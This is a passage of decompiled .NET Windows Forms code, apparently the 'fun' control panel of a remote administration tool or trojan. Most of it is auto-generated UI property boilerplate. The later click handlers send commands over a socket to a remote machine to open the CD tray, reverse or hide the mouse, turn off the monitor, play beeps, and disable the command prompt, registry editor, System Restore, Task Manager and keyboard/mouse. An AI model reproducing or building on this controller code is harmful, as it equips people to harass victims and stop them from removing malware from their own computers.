		}

		// Token: 0x170000E2 RID: 226
		// (get) Token: 0x0600025E RID: 606 RVA: 0x0015EA14 File Offset: 0x0015CE14
		// (set) Token: 0x0600025F RID: 607 RVA: 0x0015EA2C File Offset: 0x0015CE2C
		internal virtual Button Button51
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button51;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button51_Click);
				bool flag = this._Button51 != null;
				if (flag)
				{
					this._Button51.Click -= eventHandler;
				}
				this._Button51 = value;
				flag = this._Button51 != null;
				if (flag)
				{
					this._Button51.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000E3 RID: 227
		// (get) Token: 0x06000260 RID: 608 RVA: 0x0015EA8C File Offset: 0x0015CE8C
		// (set) Token: 0x06000261 RID: 609 RVA: 0x0015EAA4 File Offset: 0x0015CEA4
		internal virtual Button Button52
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button52;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button52_Click);
				bool flag = this._Button52 != null;
				if (flag)
				{
					this._Button52.Click -= eventHandler;
				}
				this._Button52 = value;
				flag = this._Button52 != null;
				if (flag)
				{
					this._Button52.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000E4 RID: 228
		// (get) Token: 0x06000262 RID: 610 RVA: 0x0015EB04 File Offset: 0x0015CF04
		// (set) Token: 0x06000263 RID: 611 RVA: 0x0015EB1C File Offset: 0x0015CF1C
		internal virtual CheckBox Check_Sound
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Check_Sound;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Check_Sound = value;
			}
		}

		// Token: 0x170000E5 RID: 229
		// (get) Token: 0x06000264 RID: 612 RVA: 0x0015EB28 File Offset: 0x0015CF28
		// (set) Token: 0x06000265 RID: 613 RVA: 0x0015EB40 File Offset: 0x0015CF40
		internal virtual GroupBox GroupBox20
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox20;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox20 = value;
			}
		}

		// Token: 0x170000E6 RID: 230
		// (get) Token: 0x06000266 RID: 614 RVA: 0x0015EB4C File Offset: 0x0015CF4C
		// (set) Token: 0x06000267 RID: 615 RVA: 0x0015EB64 File Offset: 0x0015CF64
		internal virtual RadioButton RadioButton10
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RadioButton10;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._RadioButton10 = value;
			}
		}

		// Token: 0x170000E7 RID: 231
		// (get) Token: 0x06000268 RID: 616 RVA: 0x0015EB70 File Offset: 0x0015CF70
		// (set) Token: 0x06000269 RID: 617 RVA: 0x0015EB88 File Offset: 0x0015CF88
		internal virtual RadioButton RadioButton9
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RadioButton9;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._RadioButton9 = value;
			}
		}

		// Token: 0x170000E8 RID: 232
		// (get) Token: 0x0600026A RID: 618 RVA: 0x0015EB94 File Offset: 0x0015CF94
		// (set) Token: 0x0600026B RID: 619 RVA: 0x0015EBAC File Offset: 0x0015CFAC
		internal virtual RadioButton RadioButton8
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RadioButton8;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._RadioButton8 = value;
			}
		}

		// Token: 0x170000E9 RID: 233
		// (get) Token: 0x0600026C RID: 620 RVA: 0x0015EBB8 File Offset: 0x0015CFB8
		// (set) Token: 0x0600026D RID: 621 RVA: 0x0015EBD0 File Offset: 0x0015CFD0
		internal virtual RadioButton RadioButton7
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RadioButton7;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._RadioButton7 = value;
			}
		}

		// Token: 0x170000EA RID: 234
		// (get) Token: 0x0600026E RID: 622 RVA: 0x0015EBDC File Offset: 0x0015CFDC
		// (set) Token: 0x0600026F RID: 623 RVA: 0x0015EBF4 File Offset: 0x0015CFF4
		internal virtual RadioButton RadioButton6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RadioButton6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._RadioButton6 = value;
			}
		}

		// Token: 0x170000EB RID: 235
		// (get) Token: 0x06000270 RID: 624 RVA: 0x0015EC00 File Offset: 0x0015D000
		// (set) Token: 0x06000271 RID: 625 RVA: 0x0015EC18 File Offset: 0x0015D018
		internal virtual RadioButton RadioButton5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RadioButton5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._RadioButton5 = value;
			}
		}

		// Token: 0x170000EC RID: 236
		// (get) Token: 0x06000272 RID: 626 RVA: 0x0015EC24 File Offset: 0x0015D024
		// (set) Token: 0x06000273 RID: 627 RVA: 0x0015EC3C File Offset: 0x0015D03C
		internal virtual GroupBox GroupBox22
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox22;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox22 = value;
			}
		}

		// Token: 0x170000ED RID: 237
		// (get) Token: 0x06000274 RID: 628 RVA: 0x0015EC48 File Offset: 0x0015D048
		// (set) Token: 0x06000275 RID: 629 RVA: 0x0015EC60 File Offset: 0x0015D060
		internal virtual RadioButton RadioButton4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RadioButton4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._RadioButton4 = value;
			}
		}

		// Token: 0x170000EE RID: 238
		// (get) Token: 0x06000276 RID: 630 RVA: 0x0015EC6C File Offset: 0x0015D06C
		// (set) Token: 0x06000277 RID: 631 RVA: 0x0015EC84 File Offset: 0x0015D084
		internal virtual PictureBox PictureBox4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PictureBox4 = value;
			}
		}

		// Token: 0x170000EF RID: 239
		// (get) Token: 0x06000278 RID: 632 RVA: 0x0015EC90 File Offset: 0x0015D090
		// (set) Token: 0x06000279 RID: 633 RVA: 0x0015ECA8 File Offset: 0x0015D0A8
		internal virtual RadioButton RadioButton3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RadioButton3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._RadioButton3 = value;
			}
		}

		// Token: 0x170000F0 RID: 240
		// (get) Token: 0x0600027A RID: 634 RVA: 0x0015ECB4 File Offset: 0x0015D0B4
		// (set) Token: 0x0600027B RID: 635 RVA: 0x0015ECCC File Offset: 0x0015D0CC
		internal virtual PictureBox PictureBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PictureBox3 = value;
			}
		}

		// Token: 0x170000F1 RID: 241
		// (get) Token: 0x0600027C RID: 636 RVA: 0x0015ECD8 File Offset: 0x0015D0D8
		// (set) Token: 0x0600027D RID: 637 RVA: 0x0015ECF0 File Offset: 0x0015D0F0
		internal virtual RadioButton RadioButton2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RadioButton2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._RadioButton2 = value;
			}
		}

		// Token: 0x170000F2 RID: 242
		// (get) Token: 0x0600027E RID: 638 RVA: 0x0015ECFC File Offset: 0x0015D0FC
		// (set) Token: 0x0600027F RID: 639 RVA: 0x0015ED14 File Offset: 0x0015D114
		internal virtual PictureBox PictureBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PictureBox2 = value;
			}
		}

		// Token: 0x170000F3 RID: 243
		// (get) Token: 0x06000280 RID: 640 RVA: 0x0015ED20 File Offset: 0x0015D120
		// (set) Token: 0x06000281 RID: 641 RVA: 0x0015ED38 File Offset: 0x0015D138
		internal virtual RadioButton RadioButton1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RadioButton1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._RadioButton1 = value;
			}
		}

		// Token: 0x170000F4 RID: 244
		// (get) Token: 0x06000282 RID: 642 RVA: 0x0015ED44 File Offset: 0x0015D144
		// (set) Token: 0x06000283 RID: 643 RVA: 0x0015ED5C File Offset: 0x0015D15C
		internal virtual PictureBox PictureBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PictureBox1 = value;
			}
		}

		// Token: 0x170000F5 RID: 245
		// (get) Token: 0x06000284 RID: 644 RVA: 0x0015ED68 File Offset: 0x0015D168
		// (set) Token: 0x06000285 RID: 645 RVA: 0x0015ED80 File Offset: 0x0015D180
		internal virtual GroupBox GroupBox21
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox21;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox21 = value;
			}
		}

		// Token: 0x170000F6 RID: 246
		// (get) Token: 0x06000286 RID: 646 RVA: 0x0015ED8C File Offset: 0x0015D18C
		// (set) Token: 0x06000287 RID: 647 RVA: 0x0015EDA4 File Offset: 0x0015D1A4
		internal virtual TextBox TextBox5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox5 = value;
			}
		}

		// Token: 0x170000F7 RID: 247
		// (get) Token: 0x06000288 RID: 648 RVA: 0x0015EDB0 File Offset: 0x0015D1B0
		// (set) Token: 0x06000289 RID: 649 RVA: 0x0015EDC8 File Offset: 0x0015D1C8
		internal virtual TextBox TextBox6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox6 = value;
			}
		}

		// Token: 0x170000F8 RID: 248
		// (get) Token: 0x0600028A RID: 650 RVA: 0x0015EDD4 File Offset: 0x0015D1D4
		// (set) Token: 0x0600028B RID: 651 RVA: 0x0015EDEC File Offset: 0x0015D1EC
		internal virtual Button Button39
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button39;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button39_Click);
				bool flag = this._Button39 != null;
				if (flag)
				{
					this._Button39.Click -= eventHandler;
				}
				this._Button39 = value;
				flag = this._Button39 != null;
				if (flag)
				{
					this._Button39.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000F9 RID: 249
		// (get) Token: 0x0600028C RID: 652 RVA: 0x0015EE4C File Offset: 0x0015D24C
		// (set) Token: 0x0600028D RID: 653 RVA: 0x0015EE64 File Offset: 0x0015D264
		internal virtual Button Button38
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button38;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button38_Click);
				bool flag = this._Button38 != null;
				if (flag)
				{
					this._Button38.Click -= eventHandler;
				}
				this._Button38 = value;
				flag = this._Button38 != null;
				if (flag)
				{
					this._Button38.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000FA RID: 250
		// (get) Token: 0x0600028E RID: 654 RVA: 0x0015EEC4 File Offset: 0x0015D2C4
		// (set) Token: 0x0600028F RID: 655 RVA: 0x0015EEDC File Offset: 0x0015D2DC
		internal virtual Panel Panel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel1 = value;
			}
		}

		// Token: 0x170000FB RID: 251
		// (get) Token: 0x06000290 RID: 656 RVA: 0x0015EEE8 File Offset: 0x0015D2E8
		// (set) Token: 0x06000291 RID: 657 RVA: 0x0015EF00 File Offset: 0x0015D300
		internal virtual Panel Panel2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel2 = value;
			}
		}

		// Token: 0x170000FC RID: 252
		// (get) Token: 0x06000292 RID: 658 RVA: 0x0015EF0C File Offset: 0x0015D30C
		// (set) Token: 0x06000293 RID: 659 RVA: 0x0015EF24 File Offset: 0x0015D324
		internal virtual Panel Panel4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel4 = value;
			}
		}

		// Token: 0x170000FD RID: 253
		// (get) Token: 0x06000294 RID: 660 RVA: 0x0015EF30 File Offset: 0x0015D330
		// (set) Token: 0x06000295 RID: 661 RVA: 0x0015EF48 File Offset: 0x0015D348
		internal virtual Button Button53
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button53;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button53_Click);
				bool flag = this._Button53 != null;
				if (flag)
				{
					this._Button53.Click -= eventHandler;
				}
				this._Button53 = value;
				flag = this._Button53 != null;
				if (flag)
				{
					this._Button53.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000FE RID: 254
		// (get) Token: 0x06000296 RID: 662 RVA: 0x0015EFA8 File Offset: 0x0015D3A8
		// (set) Token: 0x06000297 RID: 663 RVA: 0x0015EFC0 File Offset: 0x0015D3C0
		internal virtual Panel Panel6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel6 = value;
			}
		}

		// Token: 0x170000FF RID: 255
		// (get) Token: 0x06000298 RID: 664 RVA: 0x0015EFCC File Offset: 0x0015D3CC
		// (set) Token: 0x06000299 RID: 665 RVA: 0x0015EFE4 File Offset: 0x0015D3E4
		internal virtual Button Button55
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button55;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button55_Click);
				bool flag = this._Button55 != null;
				if (flag)
				{
					this._Button55.Click -= eventHandler;
				}
				this._Button55 = value;
				flag = this._Button55 != null;
				if (flag)
				{
					this._Button55.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000100 RID: 256
		// (get) Token: 0x0600029A RID: 666 RVA: 0x0015F044 File Offset: 0x0015D444
		// (set) Token: 0x0600029B RID: 667 RVA: 0x0015F05C File Offset: 0x0015D45C
		internal virtual Panel Panel7
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel7;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel7 = value;
			}
		}

		// Token: 0x17000101 RID: 257
		// (get) Token: 0x0600029C RID: 668 RVA: 0x0015F068 File Offset: 0x0015D468
		// (set) Token: 0x0600029D RID: 669 RVA: 0x0015F080 File Offset: 0x0015D480
		internal virtual GroupBox GroupBox16
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox16;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox16 = value;
			}
		}

		// Token: 0x17000102 RID: 258
		// (get) Token: 0x0600029E RID: 670 RVA: 0x0015F08C File Offset: 0x0015D48C
		// (set) Token: 0x0600029F RID: 671 RVA: 0x0015F0A4 File Offset: 0x0015D4A4
		internal virtual Button Button34
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button34;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button34_Click);
				bool flag = this._Button34 != null;
				if (flag)
				{
					this._Button34.Click -= eventHandler;
				}
				this._Button34 = value;
				flag = this._Button34 != null;
				if (flag)
				{
					this._Button34.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000103 RID: 259
		// (get) Token: 0x060002A0 RID: 672 RVA: 0x0015F104 File Offset: 0x0015D504
		// (set) Token: 0x060002A1 RID: 673 RVA: 0x0015F11C File Offset: 0x0015D51C
		internal virtual TextBox TextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox1 = value;
			}
		}

		// Token: 0x17000104 RID: 260
		// (get) Token: 0x060002A2 RID: 674 RVA: 0x0015F128 File Offset: 0x0015D528
		// (set) Token: 0x060002A3 RID: 675 RVA: 0x0015F140 File Offset: 0x0015D540
		internal virtual GroupBox GroupBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupBox3 = value;
			}
		}

		// Token: 0x17000105 RID: 261
		// (get) Token: 0x060002A4 RID: 676 RVA: 0x0015F14C File Offset: 0x0015D54C
		// (set) Token: 0x060002A5 RID: 677 RVA: 0x0015F164 File Offset: 0x0015D564
		internal virtual Button Button5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button5_Click);
				bool flag = this._Button5 != null;
				if (flag)
				{
					this._Button5.Click -= eventHandler;
				}
				this._Button5 = value;
				flag = this._Button5 != null;
				if (flag)
				{
					this._Button5.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000106 RID: 262
		// (get) Token: 0x060002A6 RID: 678 RVA: 0x0015F1C4 File Offset: 0x0015D5C4
		// (set) Token: 0x060002A7 RID: 679 RVA: 0x0015F1DC File Offset: 0x0015D5DC
		internal virtual Button Button6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button6_Click);
				bool flag = this._Button6 != null;
				if (flag)
				{
					this._Button6.Click -= eventHandler;
				}
				this._Button6 = value;
				flag = this._Button6 != null;
				if (flag)
				{
					this._Button6.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000107 RID: 263
		// (get) Token: 0x060002A8 RID: 680 RVA: 0x0015F23C File Offset: 0x0015D63C
		// (set) Token: 0x060002A9 RID: 681 RVA: 0x0015F254 File Offset: 0x0015D654
		internal virtual Button Button7
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button7;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button7_Click);
				bool flag = this._Button7 != null;
				if (flag)
				{
					this._Button7.Click -= eventHandler;
				}
				this._Button7 = value;
				flag = this._Button7 != null;
				if (flag)
				{
					this._Button7.Click += eventHandler;
				}
			}
		}

		// Token: 0x060002AA RID: 682 RVA: 0x0015F2B4 File Offset: 0x0015D6B4
		private void Button1_Click(object sender, EventArgs e)
		{
			this.s.Send("OpenCD");
		}

		// Token: 0x060002AB RID: 683 RVA: 0x0015F2CC File Offset: 0x0015D6CC
		private void Button2_Click(object sender, EventArgs e)
		{
			this.s.Send("CloseCD");
		}

		// Token: 0x060002AC RID: 684 RVA: 0x0015F2E4 File Offset: 0x0015D6E4
		private void Button17_Click(object sender, EventArgs e)
		{
			this.s.Send("ReverseMouse");
		}

		// Token: 0x060002AD RID: 685 RVA: 0x0015F2FC File Offset: 0x0015D6FC
		private void Button16_Click(object sender, EventArgs e)
		{
			this.s.Send("NormalMouse");
		}

		// Token: 0x060002AE RID: 686 RVA: 0x0015F314 File Offset: 0x0015D714
		private void Button13_Click(object sender, EventArgs e)
		{
			this.s.Send("DisableCMD");
		}

		// Token: 0x060002AF RID: 687 RVA: 0x0015F32C File Offset: 0x0015D72C
		private void Button12_Click(object sender, EventArgs e)
		{
			this.s.Send("DisableRegistry");
		}

		// Token: 0x060002B0 RID: 688 RVA: 0x0015F344 File Offset: 0x0015D744
		private void Button18_Click(object sender, EventArgs e)
		{
			this.s.Send("DisableRegistry");
		}

		// Token: 0x060002B1 RID: 689 RVA: 0x0015F35C File Offset: 0x0015D75C
		private void Button19_Click(object sender, EventArgs e)
		{
			this.s.Send("EnableRegistry");
		}

		// Token: 0x060002B2 RID: 690 RVA: 0x0015F374 File Offset: 0x0015D774
		private void Button20_Click(object sender, EventArgs e)
		{
			this.s.Send("DisableRestore");
		}

		// Token: 0x060002B3 RID: 691 RVA: 0x0015F38C File Offset: 0x0015D78C
		private void Button21_Click(object sender, EventArgs e)
		{
			this.s.Send("EnableRestore");
		}

		// Token: 0x060002B4 RID: 692 RVA: 0x0015F3A4 File Offset: 0x0015D7A4
		private void Button22_Click(object sender, EventArgs e)
		{
			this.s.Send("DisableTaskManager");
		}

		// Token: 0x060002B5 RID: 693 RVA: 0x0015F3BC File Offset: 0x0015D7BC
		private void Button23_Click(object sender, EventArgs e)
		{
			this.s.Send("EnableTaskManager");
		}

		// Token: 0x060002B6 RID: 694 RVA: 0x0015F3D4 File Offset: 0x0015D7D4
		private void Button28_Click(object sender, EventArgs e)
		{
			this.s.Send("CursorHide");
		}

		// Token: 0x060002B7 RID: 695 RVA: 0x0015F3EC File Offset: 0x0015D7EC
		private void Button29_Click(object sender, EventArgs e)
		{
			this.s.Send("CursorShow");
		}

		// Token: 0x060002B8 RID: 696 RVA: 0x0015F404 File Offset: 0x0015D804
		private void Button14_Click(object sender, EventArgs e)
		{
			this.s.Send("TurnOnMonitor");
		}

		// Token: 0x060002B9 RID: 697 RVA: 0x0015F41C File Offset: 0x0015D81C
		private void Button15_Click(object sender, EventArgs e)
		{
			this.s.Send("TurnOffMonitor");
		}

		// Token: 0x060002BA RID: 698 RVA: 0x0015F434 File Offset: 0x0015D834
		private void Button4_Click(object sender, EventArgs e)
		{
			this.s.Send("DisableKM");
		}

		// Token: 0x060002BB RID: 699 RVA: 0x0015F44C File Offset: 0x0015D84C
		private void Button3_Click(object sender, EventArgs e)
		{
			this.s.Send("EnableKM");
		}

		// Token: 0x060002BC RID: 700
		[DllImport("KERNEL32.DLL")]
		public static extern void Beep(int freq, int dur);

		// Token: 0x060002BD RID: 701 RVA: 0x0015F464 File Offset: 0x0015D864
		private void Button52_Click(object sender, EventArgs e)
		{
			NewLateBinding.LateCall(this.s, null, "Send", new object[] { Operators.ConcatenateObject(Operators.ConcatenateObject("piano", MyProject.Forms.Form1.Yy), 361) }, null, null, null, true);
			bool flag = !this.Check_Sound.Checked;
			if (!flag)
			{
				fun.Beep(361, 300);
			}
		}

		// Token: 0x060002BE RID: 702 RVA: 0x0015F4E4 File Offset: 0x0015D8E4
		private void Button44_Click(object sender, EventArgs e)
		{
			NewLateBinding.LateCall(this.s, null, "Send", new object[] { Operators.ConcatenateObject(Operators.ConcatenateObject("piano", MyProject.Forms.Form1.Yy), 277) }, null, null, null, true);
			bool flag = !this.Check_Sound.Checked;
			if (!flag)
			{
				fun.Beep(277, 300);
			}
		}

		// Token: 0x060002BF RID: 703 RVA: 0x0015F564 File Offset: 0x0015D964
		private void Button51_Click(object sender, EventArgs e)
		{
			NewLateBinding.LateCall(this.s, null, "Send", new object[] { Operators.ConcatenateObject(Operators.ConcatenateObject("piano", MyProject.Forms.Form1.Yy), 393) }, null, null, null, true);
			bool flag = !this.Check_Sound.Checked;
			if (!flag)
			{
				fun.Beep(393, 300);
			}
		}

		// Token: 0x060002C0 RID: 704 RVA: 0x0015F5E4 File Offset: 0x0015D9E4
		private void Button43_Click(object sender, EventArgs e)
		{
			NewLateBinding.LateCall(this.s, null, "Send", new object[] { Operators.ConcatenateObject(Operators.ConcatenateObject("piano", MyProject.Forms.Form1.Yy), 311) }, null, null, null, true);
			bool flag = !this.Check_Sound.Checked;
			if (!flag)
			{
				fun.Beep(311, 300);
			}
		}

		// Token: 0x060002C1 RID: 705 RVA: 0x0015F664 File Offset: 0x0015DA64
		private void Button50_Click(object sender, EventArgs e)
		{
			NewLateBinding.LateCall(this.s, null, "Send", new object[] { Operators.ConcatenateObject(Operators.ConcatenateObject("piano", MyProject.Forms.Form1.Yy), 429) }, null, null, null, true);
			bool flag = !this.Check_Sound.Checked;
			if (!flag)
			{
				fun.Beep(429, 300);
			}
		}

		// Token: 0x060002C2 RID: 706 RVA: 0x0015F6E4 File Offset: 0x0015DAE4
		private void Button49_Click(object sender, EventArgs e)
		{
			NewLateBinding.LateCall(this.s, null, "Send", new object[] { Operators.ConcatenateObject(Operators.ConcatenateObject("piano", MyProject.Forms.Form1.Yy), 449) }, null, null, null, true);
			bool flag = !this.Check_Sound.Checked;
			if (!flag)
			{
				fun.Beep(449, 300);
			}
		}

		// Token: 0x060002C3 RID: 707 RVA: 0x0015F764 File Offset: 0x0015DB64
		private void Button42_Click(object sender, EventArgs e)
		{
			NewLateBinding.LateCall(this.s, null, "Send", new object[] { Operators.ConcatenateObject(Operators.ConcatenateObject("piano", MyProject.Forms.Form1.Yy), 369) }, null, null, null, true);
			bool flag = !this.Check_Sound.Checked;
			if (!flag)
			{
				fun.Beep(369, 300);
			}
		}

		// Token: 0x060002C4 RID: 708 RVA: 0x0015F7E4 File Offset: 0x0015DBE4
		private void Button48_Click(object sender, EventArgs e)
		{
			NewLateBinding.LateCall(this.s, null, "Send", new object[] { Operators.ConcatenateObject(Operators.ConcatenateObject("piano", MyProject.Forms.Form1.Yy), 491) }, null, null, null, true);
			bool flag = !this.Check_Sound.Checked;
			if (!flag)
			{
				fun.Beep(491, 300);
			}
		}

		// Token: 0x060002C5 RID: 709 RVA: 0x0015F864 File Offset: 0x0015DC64
		private void Button41_Click(object sender, EventArgs e)
		{
			NewLateBinding.LateCall(this.s, null, "Send", new object[] { Operators.ConcatenateObject(Operators.ConcatenateObject("piano", MyProject.Forms.Form1.Yy), 415) }, null, null, null, true);
			bool flag = !this.Check_Sound.Checked;
			if (!flag)
			{
				fun.Beep(415, 300);
			}
		}

		// Token: 0x060002C6 RID: 710 RVA: 0x0015F8E4 File Offset: 0x0015DCE4
		private void Button47_Click(object sender, EventArgs e)
		{
			NewLateBinding.LateCall(this.s, null, "Send", new object[] { Operators.ConcatenateObject(Operators.ConcatenateObject("piano", MyProject.Forms.Form1.Yy), 540) }, null, null, null, true);
			bool flag = !this.Check_Sound.Checked;
			if (!flag)
			{
				fun.Beep(540, 300);
			}
		}

		// Token: 0x060002C7 RID: 711 RVA: 0x0015F964 File Offset: 0x0015DD64
		private void Button40_Click(object sender, EventArgs e)
		{
			NewLateBinding.LateCall(this.s, null, "Send", new object[] { Operators.ConcatenateObject(Operators.ConcatenateObject("piano", MyProject.Forms.Form1.Yy), 466) }, null, null, null, true);
			bool flag = !this.Check_Sound.Checked;
			if (!flag)
			{
				fun.Beep(466, 300);
			}
		}

		// Token: 0x060002C8 RID: 712 RVA: 0x0015F9E4 File Offset: 0x0015DDE4
		private void Button46_Click(object sender, EventArgs e)
		{
			NewLateBinding.LateCall(this.s, null, "Send", new object[] { Operators.ConcatenateObject(Operators.ConcatenateObject("piano", MyProject.Forms.Form1.Yy), 593) }, null, null, null, true);
			bool flag = !this.Check_Sound.Checked;
			if (!flag)
			{
				fun.Beep(593, 300);
			}
		}

		// Token: 0x060002C9 RID: 713 RVA: 0x0015FA64 File Offset: 0x0015DE64
		private void Button45_Click(object sender, EventArgs e)
		{
			NewLateBinding.LateCall(this.s, null, "Send", new object[] { Operators.ConcatenateObject(Operators.ConcatenateObject("piano", MyProject.Forms.Form1.Yy), 623) }, null, null, null, true);
			bool flag = !this.Check_Sound.Checked;
			if (!flag)
			{
				fun.Beep(623, 300);
			}
		}

		// Token: 0x060002CA RID: 714 RVA: 0x0015FAE4 File Offset: 0x0015DEE4
		private void Button37_Click(object sender, EventArgs e)
		{
			object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("SAPI.Spvoice", ""));
			object obj = objectValue;
			Type type = null;
			string text = "speak";
			object[] array = new object[1];
			object[] array2 = array;
			int num = 0;
			TextBox textBox = this.TextBox4;
			array2[num] = textBox.Text;
			object[] array3 = array;
			object[] array4 = array3;
			string[] array5 = null;
			Type[] array6 = null;
			bool[] array7 = new bool[] { true };
			NewLateBinding.LateCall(obj, type, text, array4, array5, array6, array7, true);
			if (array7[0])
			{
				textBox.Text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array3[0]), typeof(string));
			}
		}

		// Token: 0x060002CB RID: 715 RVA: 0x0015FB6C File Offset: 0x0015DF6C
		private void Button36_Click(object sender, EventArgs e)
